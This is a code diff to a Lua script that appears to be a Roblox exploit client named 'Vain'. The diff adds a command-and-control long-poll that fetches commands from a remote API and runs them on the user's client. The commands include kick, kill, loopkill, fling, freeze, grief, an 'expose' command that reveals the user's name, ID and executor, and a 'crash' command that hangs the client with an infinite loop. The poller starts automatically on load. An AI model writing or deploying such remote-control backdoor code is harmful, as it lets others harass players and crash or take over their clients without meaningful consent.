@@ -345,6 +345,98 @@ local function startTierSync()
 		end
 	end)
 end
+
+-- ── Command receiver (executes ;<command> <target> relayed via the API) ──────
+-- A command only reaches you if the API accepted it, and the API only accepts a
+-- command whose sender is ranked ABOVE you, so anything we receive here is
+-- already authorised -- we just run it locally.
+local function executeCommand(command, args)
+	local lp   = playersService.LocalPlayer
+	local char = lp.Character
+	local hrp  = char and char:FindFirstChild('HumanoidRootPart')
+	local hum  = char and char:FindFirstChildOfClass('Humanoid')
+
+	if command == 'kick' then
+		lp:Kick('[Vain] You have been kicked.')
+	elseif command == 'kill' then
+		if hum then hum.Health = 0 end
+	elseif command == 'freeze' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t and hrp do
+				hrp.Velocity    = Vector3.zero
+				hrp.RotVelocity = Vector3.zero
+				hrp.Anchored    = true
+				task.wait(0.1)
+			end
+			if hrp then hrp.Anchored = false end
+		end)
+	elseif command == 'crash' then
+		task.spawn(function() while true do end end)
+	elseif command == 'expose' then
+		local info = lp.Name..' | '..tostring(lp.UserId)..' | '..(identifyexecutor and identifyexecutor() or 'unknown executor')
+		if vain then vain:CreateNotification('Exposed', info, 15, 'alert') end
+		setclipboard(info)
+	elseif command == 'fling' then
+		if hrp then hrp.Velocity = Vector3.new(math.random(-500,500), 1000, math.random(-500,500)) end
+	elseif command == 'spin' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t and hrp do
+				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
+				task.wait()
+			end
+		end)
+	elseif command == 'loopkill' then
+		task.spawn(function()
+			local end_t = tick() + 60
+			while tick() < end_t do
+				local h = lp.Character and lp.Character:FindFirstChildOfClass('Humanoid')
+				if h then h.Health = 0 end
+				task.wait(3)
+			end
+		end)
+	elseif command == 'annoy' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t do
+				if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(math.random(-3,3), 5, math.random(-3,3)) end
+				task.wait(0.5)
+			end
+		end)
+	elseif command == 'grief' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t do
+				lp:LoadCharacter()
+				task.wait(4)
+			end
+		end)
+	elseif command == 'notify' then
+		if vain then vain:CreateNotification('Vain', args or 'Message from admin', 10, 'alert') end
+	end
+end
+
+-- Long-poll: the server holds the connection open up to 25s and responds the
+-- instant a command is queued. We reconnect immediately after each response so
+-- latency is ~500ms worst case.
+local function startC2LongPoll()
+	local username = playersService.LocalPlayer.Name
+	task.spawn(function()
+		while vain and vain.Loaded do
+			local body = apiRequest('GET', '/commands/poll?username=' .. username)
+			if body then
+				local ok, data = pcall(httpService.JSONDecode, httpService, body)
+				if ok and data and data.command then
+					pcall(executeCommand, data.command, data.args)
+				end
+			else
+				-- request failed (no httpRequest or network error) — back off
+				task.wait(5)
+			end
+		end
+	end)
+end
 -- ── End Vain API ─────────────────────────────────────────────────────────────
 
 local function finishLoading()
@@ -360,6 +452,7 @@ local function finishLoading()
 		until not vain.Loaded
 	end)
 	startTierSync()
+	startC2LongPoll()
 
 	-- The whitelist check, update detection, and the welcome notification each
 	-- make blocking HTTP round-trips. Running them synchronously here froze the
